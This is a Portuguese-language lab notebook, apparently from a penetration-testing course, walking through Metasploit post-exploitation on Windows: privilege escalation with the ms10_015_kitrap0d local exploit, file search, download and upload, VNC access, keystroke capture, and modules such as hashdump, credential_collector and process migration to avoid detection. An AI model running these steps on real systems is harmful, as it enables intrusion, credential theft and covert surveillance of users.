# Pós Exploração em Sistemas Comprometidos
 aqui serão documentadas as atividades práticas realizadas no laboratório local referente a pós exploração em sistemas comprometidos, onde o objetivo é se manter conectado ao sistema alvo por meio de: escalonamento de privilégios, manutenção de acesso, limpeza de rastros entre outros.

 ## escalonamento de privilégios no windows
 pós exploração refere-se a partir do momento que uma falha é explorada e iniciar a sessão ao sistema alvo.
 uma sessão é um shell interativo que permite a execução de comandos no sistema comprometido.

 ### o escalonamento de privilégios
o escalonamento de privilégios é o processo de obter privilégios mais altos no sistema comprometido, permitindo ao atacante executar ações que normalmente seriam restritas.
ele se tá como o objetivo de obter acesso administrativo ou root no sistema alvo apartir de uma conta com privilégios limitados(ex: usuário comum).

para realizar o escalonamento de privilégios,vamos reaproveitar o backdoor aberto no [seção "meterpreter como backdoor"](<técnicas de exploração de vulnerabilidade.md#meterpreter-como-backdoor>)
, onde já temos acesso ao sistema alvo com privilégios limitados.
1. identificar a versão do sistema operacional:
   - use o comando `systeminfo` para obter informações detalhadas sobre o sistema operacional, incluindo a versão e atualizações instaladas.
2. verificar o nosso privilégio atual:
   - use o comando `getuid` para listar os privilégios atuais do usuário.
3. voltar a sessão meterpreter:
   - use o comando `background` para voltar a sessão meterpreter aberta anteriormente.
4. selecionar o exploit adequado:
   - use o comando `search` para encontrar exploits relacionados à versão do sistema operacional identificado. o encontrado foi o `exploit/windows/local/ms10_015_kitrap0d`.
5. configurar o exploit:
    - use o comando `use exploit/windows/local/ms10_015_kitrap0d` para selecionar o exploit encontrado.
    - use o comando `set SESSION <ID da sessão>` para definir a sessão atual do meterpreter.
    (**obs:** o payload vai criar uma nova sessão com privilégios elevados, então será necessário trocar a porta usada para evitar conflito.)
6. definir o payload:
   - use o comando `set [ip <seu IP>]` para definir o payload.
   - use o comando `set LPORT <porta diferente da usada anteriormente>` para definir a porta de escuta.
7. executar o exploit:
   - use o comando `exploit` para executar o exploit.
8. verificar a nova sessão:
   - use o comando `sessions` para listar todas as sessões ativas.
   - use o comando `sessions -i <ID da nova sessão>` para interagir com a nova sessão.
   - use o comando `getuid` para verificar os privilégios atuais do usuário na nova sessão.
 ### extração de dados com metasploit
após obter privilégios elevados no sistema comprometido, o próximo passo é extrair dados sensíveis do sistema alvo.
1.visão geral do sistema de arquivos:
   - use o comando `ls` para listar os diretórios e arquivos no sistema comprometido.
   - use o comando `cd <diretório>` para navegar entre os diretórios.
2.localizar arquivos sensíveis:
   - use o comando `search -f <nome do arquivo>` para procurar arquivos específicos, como arquivos de configuração, bancos de dados ou documentos importantes.
3.extrair arquivos:
   - rodar o comando `run vnc` para obter acesso remoto ao sistema comprometido.
   - usar o comando `keyscan_start` para iniciar a captura de teclas digitadas no sistema alvo.
   - usar o comando `keyscan_dump` para visualizar as teclas capturadas.
   - usar o comando `download <caminho do arquivo>` para baixar arquivos específicos do sistema comprometido para o seu sistema local.
4. subir arquivos:
   - use o comando `upload <caminho do arquivo local> <caminho do destino no sistema comprometido>` para enviar arquivos do seu sistema local para o sistema comprometido.
 ### módulos de pós exploração
o metasploit oferece uma variedade de módulos de pós exploração que podem ser usados para realizar ações adicionais no sistema comprometido. alguns exemplos incluem:
- extração de credenciais: recuperar senhas armazenadas no sistema comprometido.
- escalonamento de privilégios: identificar e explorar vulnerabilidades adicionais para obter privilégios mais altos.
- capturas de informações do sistema: coletar informações detalhadas sobre o sistema comprometido, como processos em execução, serviços ativos e configurações de rede.
- capturar de dados sensíveis: localizar e extrair arquivos importantes do sistema comprometido.

- o que cada módulo faz:
    - m̀igrate: permite migrar o processo do meterpreter para outro processo em execução no sistema comprometido, o que pode ajudar a manter o acesso e evitar a detecção.
    -hashdump: extrai hashes de senhas do sistema comprometido, que podem ser usados para ataques de força bruta ou para obter acesso adicional.
    - enum_shares: lista os compartilhamentos de rede disponíveis no sistema comprometido.
        - enum_applications: lista os aplicativos instalados no sistema comprometido.
    - dumplinks: extrai informações de links simbólicos no sistema comprometido.
    - credential_collector: coleta credenciais armazenadas no sistema comprometido, como senhas salvas em navegadores ou aplicativos.
    - arp_scanner: realiza uma varredura ARP na rede local para identificar outros dispositivos conectados.
    - local_exploit_suggester: sugere exploits locais que podem ser usados para escalonamento de privilégios com base na configuração do sistema comprometido.
